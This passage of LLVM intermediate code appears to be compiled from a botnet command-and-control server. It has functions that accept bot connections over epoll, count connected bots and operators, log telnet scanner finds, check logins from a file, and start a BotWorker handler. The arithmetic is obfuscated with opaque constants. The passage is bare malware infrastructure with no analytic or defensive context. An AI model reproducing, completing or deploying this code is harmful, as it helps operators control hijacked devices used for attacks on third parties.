  %15 = alloca %struct.clientdata_t*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i64, align 8
  %18 = alloca [2048 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %22 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %23 = bitcast i8* %22 to %struct.epoll_event*
  store %struct.epoll_event* %23, %struct.epoll_event** %5, align 8
  br label %24

; <label>:24:                                     ; preds = %322, %1
  %25 = load volatile i32, i32* @epollFD, align 4
  %26 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %27 = call i32 @epoll_wait(i32 %25, %struct.epoll_event* %26, i32 1000000, i32 -1)
  store i32 %27, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %28

; <label>:28:                                     ; preds = %315, %24
  %29 = load i32, i32* %8, align 4
  %30 = load i32, i32* %7, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %322

; <label>:32:                                     ; preds = %28
  %33 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %33, i64 %35
  %37 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %36, i32 0, i32 0
  %38 = load i32, i32* %37, align 1
  %39 = xor i32 8, -1
  %40 = xor i32 %38, %39
  %41 = and i32 %40, %38
  %42 = and i32 %38, 8
  %43 = icmp ne i32 %41, 0
  br i1 %43, label %72, label %44

; <label>:44:                                     ; preds = %32
  %45 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %45, i64 %47
  %49 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %48, i32 0, i32 0
  %50 = load i32, i32* %49, align 1
  %51 = xor i32 %50, -1
  %52 = xor i32 16, -1
  %53 = xor i32 -1794445573, -1
  %54 = or i32 %51, %52
  %55 = or i32 -1794445573, %53
  %56 = xor i32 %54, -1
  %57 = and i32 %56, %55
  %58 = and i32 %50, 16
  %59 = icmp ne i32 %57, 0
  br i1 %59, label %72, label %60

; <label>:60:                                     ; preds = %44
  %61 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %61, i64 %63
  %65 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %64, i32 0, i32 0
  %66 = load i32, i32* %65, align 1
  %67 = xor i32 1, -1
  %68 = xor i32 %66, %67
  %69 = and i32 %68, %66
  %70 = and i32 %66, 1
  %71 = icmp ne i32 %69, 0
  br i1 %71, label %91, label %72

; <label>:72:                                     ; preds = %60, %44, %32
  %73 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %73, i64 %75
  %77 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %76, i32 0, i32 1
  %78 = bitcast %union.epoll_data* %77 to i32*
  %79 = load i32, i32* %78, align 1
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %80
  %82 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %81, i32 0, i32 1
  store i8 0, i8* %82, align 4
  %83 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %83, i64 %85
  %87 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %86, i32 0, i32 1
  %88 = bitcast %union.epoll_data* %87 to i32*
  %89 = load i32, i32* %88, align 1
  %90 = call i32 @close(i32 %89)
  br label %315

; <label>:91:                                     ; preds = %60
  %92 = load volatile i32, i32* @listenFD, align 4
  %93 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %94 = load i32, i32* %8, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %93, i64 %95
  %97 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %96, i32 0, i32 1
  %98 = bitcast %union.epoll_data* %97 to i32*
  %99 = load i32, i32* %98, align 1
  %100 = icmp eq i32 %92, %99
  br i1 %100, label %101, label %204

; <label>:101:                                    ; preds = %91
  br label %102

; <label>:102:                                    ; preds = %196, %172, %169, %101
  store i32 16, i32* %10, align 4
  %103 = load volatile i32, i32* @listenFD, align 4
  %104 = call i32 @accept(i32 %103, %struct.sockaddr* %9, i32* %10)
  store i32 %104, i32* %11, align 4
  %105 = load i32, i32* %11, align 4
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %107, label %117

; <label>:107:                                    ; preds = %102
  %108 = call i32* @__errno_location() #9
  %109 = load i32, i32* %108, align 4
  %110 = icmp eq i32 %109, 11
  br i1 %110, label %115, label %111

; <label>:111:                                    ; preds = %107
  %112 = call i32* @__errno_location() #9
  %113 = load i32, i32* %112, align 4
  %114 = icmp eq i32 %113, 11
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %111, %107
  br label %203

; <label>:116:                                    ; preds = %111
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0))
  br label %203

; <label>:117:                                    ; preds = %102
  %118 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %119 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %118, i32 0, i32 2
  %120 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %119, i32 0, i32 0
  %121 = load i32, i32* %120, align 2
  %122 = load i32, i32* %11, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %123
  %125 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %124, i32 0, i32 0
  store i32 %121, i32* %125, align 8
  store i32 0, i32* %13, align 4
  store i32 0, i32* %12, align 4
  br label %126

; <label>:126:                                    ; preds = %155, %117
  %127 = load i32, i32* %12, align 4
  %128 = icmp slt i32 %127, 1000000
  br i1 %128, label %129, label %162

; <label>:129:                                    ; preds = %126
  %130 = load i32, i32* %12, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %131
  %133 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %132, i32 0, i32 1
  %134 = load i8, i8* %133, align 4
  %135 = icmp ne i8 %134, 0
  br i1 %135, label %136, label %140

; <label>:136:                                    ; preds = %129
  %137 = load i32, i32* %12, align 4
  %138 = load i32, i32* %11, align 4
  %139 = icmp eq i32 %137, %138
  br i1 %139, label %140, label %141

; <label>:140:                                    ; preds = %136, %129
  br label %155

; <label>:141:                                    ; preds = %136
  %142 = load i32, i32* %12, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %143
  %145 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %144, i32 0, i32 0
  %146 = load i32, i32* %145, align 8
  %147 = load i32, i32* %11, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %148
  %150 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %149, i32 0, i32 0
  %151 = load i32, i32* %150, align 8
  %152 = icmp eq i32 %146, %151
  br i1 %152, label %153, label %154

; <label>:153:                                    ; preds = %141
  store i32 1, i32* %13, align 4
  br label %162

; <label>:154:                                    ; preds = %141
  br label %155

; <label>:155:                                    ; preds = %154, %140
  %156 = load i32, i32* %12, align 4
  %157 = sub i32 0, %156
  %158 = sub i32 0, 1
  %159 = add i32 %157, %158
  %160 = sub i32 0, %159
  %161 = add nsw i32 %156, 1
  store i32 %160, i32* %12, align 4
  br label %126

; <label>:162:                                    ; preds = %153, %126
  %163 = load i32, i32* %13, align 4
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %165, label %175

; <label>:165:                                    ; preds = %162
  %166 = load i32, i32* %11, align 4
  %167 = call i64 @send(i32 %166, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i32 0, i32 0), i64 13, i32 16384)
  %168 = icmp eq i64 %167, -1
  br i1 %168, label %169, label %172

; <label>:169:                                    ; preds = %165
  %170 = load i32, i32* %11, align 4
  %171 = call i32 @close(i32 %170)
  br label %102

; <label>:172:                                    ; preds = %165
  %173 = load i32, i32* %11, align 4
  %174 = call i32 @close(i32 %173)
  br label %102

; <label>:175:                                    ; preds = %162
  %176 = load i32, i32* %11, align 4
  %177 = call i32 @make_socket_non_blocking(i32 %176)
  store i32 %177, i32* %6, align 4
  %178 = load i32, i32* %6, align 4
  %179 = icmp eq i32 %178, -1
  br i1 %179, label %180, label %183

; <label>:180:                                    ; preds = %175
  %181 = load i32, i32* %11, align 4
  %182 = call i32 @close(i32 %181)
  br label %203

; <label>:183:                                    ; preds = %175
  %184 = load i32, i32* %11, align 4
  %185 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %186 = bitcast %union.epoll_data* %185 to i32*
  store i32 %184, i32* %186, align 1
  %187 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %187, align 1
  %188 = load volatile i32, i32* @epollFD, align 4
  %189 = load i32, i32* %11, align 4
  %190 = call i32 @epoll_ctl(i32 %188, i32 1, i32 %189, %struct.epoll_event* %4) #7
  store i32 %190, i32* %6, align 4
  %191 = load i32, i32* %6, align 4
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %193, label %196

; <label>:193:                                    ; preds = %183
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  %194 = load i32, i32* %11, align 4
  %195 = call i32 @close(i32 %194)
  br label %203

; <label>:196:                                    ; preds = %183
  %197 = load i32, i32* %11, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %198
  %200 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %199, i32 0, i32 1
  store i8 1, i8* %200, align 4
  %201 = load i32, i32* %11, align 4
  %202 = call i64 @send(i32 %201, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i32 0, i32 0), i64 14, i32 16384)
  br label %102

; <label>:203:                                    ; preds = %193, %180, %116, %115
  br label %315

; <label>:204:                                    ; preds = %91
  %205 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %206 = load i32, i32* %8, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %205, i64 %207
  %209 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %208, i32 0, i32 1
  %210 = bitcast %union.epoll_data* %209 to i32*
  %211 = load i32, i32* %210, align 1
  store i32 %211, i32* %14, align 4
  %212 = load i32, i32* %14, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %213
  store %struct.clientdata_t* %214, %struct.clientdata_t** %15, align 8
  store i32 0, i32* %16, align 4
  %215 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %216 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %215, i32 0, i32 1
  store i8 1, i8* %216, align 4
  br label %217

; <label>:217:                                    ; preds = %311, %204
  %218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %218, i8 0, i64 2048, i32 16, i1 false)
  br label %219

; <label>:219:                                    ; preds = %286, %285, %278, %270, %251, %245, %217
  %220 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %220, i8 0, i64 2048, i32 16, i1 false)
  %221 = icmp ne i8* %220, null
  br i1 %221, label %222, label %228

; <label>:222:                                    ; preds = %219
  %223 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %224 = load i32, i32* %14, align 4
  %225 = call i32 @fdgets(i8* %223, i32 2048, i32 %224)
  %226 = sext i32 %225 to i64
  store i64 %226, i64* %17, align 8
  %227 = icmp sgt i64 %226, 0
  br label %228

; <label>:228:                                    ; preds = %222, %219
  %229 = phi i1 [ false, %219 ], [ %227, %222 ]
  br i1 %229, label %230, label %289

; <label>:230:                                    ; preds = %228
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %232 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #8
  %233 = icmp eq i8* %232, null
  br i1 %233, label %234, label %235

; <label>:234:                                    ; preds = %230
  store i32 1, i32* %16, align 4
  br label %289

; <label>:235:                                    ; preds = %230
  %236 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  call void @trim(i8* %236)
  %237 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %238 = call i32 @strcmp(i8* %237, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %246

; <label>:240:                                    ; preds = %235
  %241 = load i32, i32* %14, align 4
  %242 = call i64 @send(i32 %241, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i64 5, i32 16384)
  %243 = icmp eq i64 %242, -1
  br i1 %243, label %244, label %245

; <label>:244:                                    ; preds = %240
  store i32 1, i32* %16, align 4
  br label %289

; <label>:245:                                    ; preds = %240
  br label %219

; <label>:246:                                    ; preds = %235
  %247 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %248 = call i8* @strstr(i8* %247, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %249 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %250 = icmp eq i8* %248, %249
  br i1 %250, label %251, label %265

; <label>:251:                                    ; preds = %246
  %252 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %253 = call i8* @strstr(i8* %252, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0)) #8
  %254 = getelementptr inbounds i8, i8* %253, i64 7
  store i8* %254, i8** %19, align 8
  %255 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %256 = load i8*, i8** %19, align 8
  %257 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %255, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i32 0, i32 0), i8* %256)
  %258 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %259 = call i32 @fflush(%struct._IO_FILE* %258)
  %260 = load volatile i32, i32* @TELFound, align 4
  %261 = sub i32 %260, -47676885
  %262 = add i32 %261, 1
  %263 = add i32 %262, -47676885
  %264 = add nsw i32 %260, 1
  store volatile i32 %263, i32* @TELFound, align 4
  br label %219

; <label>:265:                                    ; preds = %246
  %266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %267 = call i8* @strstr(i8* %266, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  %268 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %269 = icmp eq i8* %267, %268
  br i1 %269, label %270, label %273

; <label>:270:                                    ; preds = %265
  %271 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %272 = call i8* @strstr(i8* %271, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i32 0, i32 0)) #8
  store i8* %272, i8** %20, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %219

; <label>:273:                                    ; preds = %265
  %274 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %275 = call i8* @strstr(i8* %274, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  %276 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %277 = icmp eq i8* %275, %276
  br i1 %277, label %278, label %281

; <label>:278:                                    ; preds = %273
  %279 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %280 = call i8* @strstr(i8* %279, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0)) #8
  store i8* %280, i8** %21, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %219

; <label>:281:                                    ; preds = %273
  %282 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %283 = call i32 @strcmp(i8* %282, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i32 0, i32 0)) #8
  %284 = icmp eq i32 %283, 0
  br i1 %284, label %285, label %286

; <label>:285:                                    ; preds = %281
  br label %219

; <label>:286:                                    ; preds = %281
  %287 = getelementptr inbounds [2048 x i8], [2048 x i8]* %18, i32 0, i32 0
  %288 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i32 0, i32 0), i8* %287)
  br label %219

; <label>:289:                                    ; preds = %244, %234, %228
  %290 = load i64, i64* %17, align 8
  %291 = icmp eq i64 %290, -1
  br i1 %291, label %292, label %298

; <label>:292:                                    ; preds = %289
  %293 = call i32* @__errno_location() #9
  %294 = load i32, i32* %293, align 4
  %295 = icmp ne i32 %294, 11
  br i1 %295, label %296, label %297

; <label>:296:                                    ; preds = %292
  store i32 1, i32* %16, align 4
  br label %297

; <label>:297:                                    ; preds = %296, %292
  br label %312

; <label>:298:                                    ; preds = %289
  %299 = load i64, i64* %17, align 8
  %300 = icmp eq i64 %299, 0
  br i1 %300, label %301, label %302

; <label>:301:                                    ; preds = %298
  store i32 1, i32* %16, align 4
  br label %312

; <label>:302:                                    ; preds = %298
  br label %303

; <label>:303:                                    ; preds = %302
  %304 = load i32, i32* %16, align 4
  %305 = icmp ne i32 %304, 0
  br i1 %305, label %306, label %311

; <label>:306:                                    ; preds = %303
  %307 = load %struct.clientdata_t*, %struct.clientdata_t** %15, align 8
  %308 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %307, i32 0, i32 1
  store i8 0, i8* %308, align 4
  %309 = load i32, i32* %14, align 4
  %310 = call i32 @close(i32 %309)
  br label %311

; <label>:311:                                    ; preds = %306, %303
  br label %217

; <label>:312:                                    ; preds = %301, %297
  br label %313

; <label>:313:                                    ; preds = %312
  br label %314

; <label>:314:                                    ; preds = %313
  br label %315

; <label>:315:                                    ; preds = %314, %203, %72
  %316 = load i32, i32* %8, align 4
  %317 = sub i32 0, %316
  %318 = sub i32 0, 1
  %319 = add i32 %317, %318
  %320 = sub i32 0, %319
  %321 = add nsw i32 %316, 1
  store i32 %320, i32* %8, align 4
  br label %28

; <label>:322:                                    ; preds = %28
  br label %24
                                                  ; No predecessors!
  %324 = load i8*, i8** %2, align 8
  ret i8* %324
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %36

; <label>:11:                                     ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 2048, -1
  %15 = xor i32 -657088532, -1
  %16 = and i32 %13, -657088532
  %17 = and i32 %12, %15
  %18 = and i32 %14, -657088532
  %19 = and i32 2048, %15
  %20 = or i32 %16, %17
  %21 = or i32 %18, %19
  %22 = xor i32 %20, %21
  %23 = or i32 %13, %14
  %24 = xor i32 %23, -1
  %25 = or i32 -657088532, %15
  %26 = and i32 %24, %25
  %27 = or i32 %22, %26
  %28 = or i32 %12, 2048
  store i32 %27, i32* %4, align 4
  %29 = load i32, i32* %3, align 4
  %30 = load i32, i32* %4, align 4
  %31 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %30)
  store i32 %31, i32* %5, align 4
  %32 = load i32, i32* %5, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %36

; <label>:35:                                     ; preds = %11
  store i32 0, i32* %2, align 4
  br label %36

; <label>:36:                                     ; preds = %35, %34, %10
  %37 = load i32, i32* %2, align 4
  ret i32 %37
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

; <label>:3:                                      ; preds = %20, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %26

; <label>:6:                                      ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

; <label>:13:                                     ; preds = %6
  br label %20

; <label>:14:                                     ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add i32 %15, -1837664956
  %17 = add i32 %16, 1
  %18 = sub i32 %17, -1837664956
  %19 = add nsw i32 %15, 1
  store i32 %18, i32* %2, align 4
  br label %20

; <label>:20:                                     ; preds = %14, %13
  %21 = load i32, i32* %1, align 4
  %22 = sub i32 %21, -1983078881
  %23 = add i32 %22, 1
  %24 = add i32 %23, -1983078881
  %25 = add nsw i32 %21, 1
  store i32 %24, i32* %1, align 4
  br label %3

; <label>:26:                                     ; preds = %3
  %27 = load i32, i32* %2, align 4
  ret i32 %27
}

; Function Attrs: noinline nounwind uwtable
define i8* @TitleWriter(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

; <label>:7:                                      ; preds = %20, %1
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 2048, i32 16, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %10 = call i32 @BotsConnected()
  %11 = load volatile i32, i32* @OperatorsConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.17, i32 0, i32 0), i32 27, i32 %10, i32 %11, i32 7) #7
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i32 0, i32 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %7
  ret i8* null

; <label>:20:                                     ; preds = %7
  %21 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @Find_Login(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

; <label>:11:                                     ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %47

; <label>:12:                                     ; preds = %1
  br label %13

; <label>:13:                                     ; preds = %30, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %35

; <label>:18:                                     ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i32 0, i32 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %30

; <label>:23:                                     ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add i32 %24, 1350337425
  %26 = add i32 %25, 1
  %27 = sub i32 %26, 1350337425
  %28 = add nsw i32 %24, 1
  store i32 %27, i32* %6, align 4
  %29 = load i32, i32* %5, align 4
  store i32 %29, i32* %7, align 4
  br label %30

; <label>:30:                                     ; preds = %23, %18
  %31 = load i32, i32* %5, align 4
  %32 = sub i32 0, 1
  %33 = sub i32 %31, %32
  %34 = add nsw i32 %31, 1
  store i32 %33, i32* %5, align 4
  br label %13

; <label>:35:                                     ; preds = %13
  %36 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %37 = icmp ne %struct._IO_FILE* %36, null
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %35
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %40 = call i32 @fclose(%struct._IO_FILE* %39)
  br label %41

; <label>:41:                                     ; preds = %38, %35
  %42 = load i32, i32* %6, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %41
  store i32 0, i32* %2, align 4
  br label %47

; <label>:45:                                     ; preds = %41
  %46 = load i32, i32* %7, align 4
  store i32 %46, i32* %2, align 4
  br label %47

; <label>:47:                                     ; preds = %45, %44, %11
  %48 = load i32, i32* %2, align 4
  ret i32 %48
}

declare %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind uwtable
define i8* @BotWorker(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca [80 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [2048 x i8], align 16
  %28 = alloca [80 x i8], align 16
